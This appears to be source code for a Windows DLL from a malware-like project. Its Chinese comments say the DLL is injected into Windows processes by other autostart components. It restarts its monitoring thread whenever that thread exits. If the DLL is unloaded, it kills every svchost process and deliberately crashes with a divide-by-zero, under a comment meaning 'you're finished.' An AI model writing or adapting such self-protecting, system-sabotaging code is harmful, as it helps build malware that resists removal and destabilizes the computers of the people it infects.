#include"MustInclude.h"
#include"../process.h"
#include"../file.h"
#include"GeneralTask.h"

#include<stdio.h>


//会被先启动其他自启动组件的注入进各种windows进程





// DLL入口点
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    static HANDLE hThread = NULL;

    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:{
        //DisableThreadLibraryCalls(hinstDLL);
        hThread = CreateThread(NULL, 0, MonitorThread, NULL, 0, NULL);
		}
        break;
    case DLL_PROCESS_DETACH://你完了
		{
		vector<int> list=getPid("svchost");
        for(int i=0;i<list.size();i++){TerminateProcessById(list[i]);}
		int a=0;int b=9/a;
		}
        break;
    
	case DLL_THREAD_DETACH:{
		DWORD exitCode = 0;if(GetExitCodeThread(hThread,&exitCode)&&exitCode!=259){hThread = CreateThread(NULL, 0, MonitorThread, NULL, 0, NULL);}
		}
		break;
	default: break;
	}
    return TRUE;
}
